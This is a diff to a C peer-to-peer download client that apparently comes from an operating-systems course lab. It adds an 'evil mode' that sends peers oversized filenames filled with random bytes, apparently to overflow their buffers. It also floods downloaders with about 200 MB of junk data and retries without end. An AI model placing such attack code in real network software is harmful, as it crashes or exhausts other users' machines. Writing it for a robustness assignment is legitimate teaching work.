@@ -38,6 +38,8 @@ static int listen_port;
 
 #define TASKBUFSIZ	65536	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
+#define BUGSIZE		1024*1024*200
+#define _EVIL 		1
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -517,6 +519,7 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 //	until a download is successful.
 static void task_download(task_t *t, task_t *tracker_task)
 {
+ 	srand(time(NULL));	
 	int i, ret = -1;
 	assert((!t || t->type == TASK_DOWNLOAD)
 	       && tracker_task->type == TASK_TRACKER);
@@ -540,19 +543,22 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-
+#if _EVIL == 1
 	// LARGE NAME FILE
 	if (evil_mode == 1){
 	  char * bbb;
 	  bbb = malloc(sizeof(char) * (FILENAMESIZ * 100 + 1));
 	  int i;
 	  for (i = 0; i < FILENAMESIZ * 100; i ++)
-	    bbb[i] = 'D';
+	    bbb[i] = rand() % 256;
 	  bbb[FILENAMESIZ*100] = 0;
 	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", bbb);
+	  task_free(t);
+	  goto try_again;
 	}
 	else 
-       	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+#endif
+  	  osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -612,7 +618,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		task_free(t);
 		return;
 	}
-	error("* Download was empty, trying next peer\n");
+//	error("* Download was empty, trying next peer\n");
 
     try_again:
 	if (t->disk_filename[0])
@@ -678,19 +684,25 @@ static void task_upload(task_t *t)
 	t->head = t->tail = 0;
 
 	if (checkValid(t->filename) == 0) error("* File %s does not in the current dir", t->filename);
+	/*if (evil_mode)
+	{
+		strcpy(t->filename, "/dev/random");
+      		message("%s\n", t->filename);
+	}*/
 	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
 		goto exit;
 	}
-
+	int i = 0;
 	message("* Transferring file %s\n", t->filename);
 	// Now, read file from disk and write it to the requesting peer.
 	if (evil_mode)
 	{
-		strcpy(t->filename, "/dev/null");
-      		message("%s\n", t->filename);
-	}		
+	  //char* str = "DEADBEEF";
+	  for (i = 0 ; i < BUGSIZE/8; i++) write(t->peer_fd, "DEADBEEF",8);
+	}
+	else
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -704,7 +716,14 @@ static void task_upload(task_t *t)
 			goto exit;
 		} else if (ret == TBUF_END && t->head == t->tail)
 			/* End of file */
-			break;
+		/*
+		{	
+		  if (evil_mode==0 || i == 1000)break;
+		  i++;
+		  close(t->disk_fd);
+		  t->disk_fd = open(t->filename, O_RDONLY);
+		}*/
+		  break;
 	}
 
 	message("* Upload of %s complete\n", t->filename);
@@ -792,34 +811,45 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
     
-    int count = 0;
+    	int count = 0;
 	// First, download files named on command line.
+	int argc_e = argc;
+	char**  argv_e = argv;
+#if _EVIL==1
+	while(1)
+#endif
+	{
+	argc = argc_e;
+	argv = argv_e;
 	for (; argc > 1; argc--, argv++) {
 	  if (strnlen(argv[1], FILENAMESIZ+1) > FILENAMESIZ) exit(1);
 		if ((t = start_download(tracker_task, argv[1])))
-        {
-	    if (strlen(argv[1]) > FILENAMESIZ) exit(1);
-            pid_t pid;
-            if ((pid = fork()) < 0)
-            {
-                error("Error msg");
-                continue;
-            }
-            if (pid == 0){
-                task_download(t, tracker_task);
-                exit(0);
-            }
-            else{
-                count++;
-                task_free(t);
-            }
-        }
+		{
+		  if (strlen(argv[1]) > FILENAMESIZ) exit(1);
+           	  pid_t pid;
+            	  if ((pid = fork()) < 0)
+            	  {
+		    error("Error msg");
+                    continue;
+            	  }
+            	  if (pid == 0){
+                  	task_download(t, tracker_task);
+                  	exit(0);
+            	  }
+            	  else{
+                	count++;
+                	task_free(t);
+            	  }  
+        	}	
 	}
-    while (count > 0)
-    {
-        waitpid(-1, NULL, 0);
-        count--;
-    }
+    	while (count > 0){
+        	waitpid(-1, NULL, 0);
+        	count--;
+    	}	
+#if _EVIL==1
+	if (evil_mode == 0) break;
+#endif
+}
 	// Then accept connections from other peers and upload files to them!
 	while ((t = task_listen(listen_task)))
     {
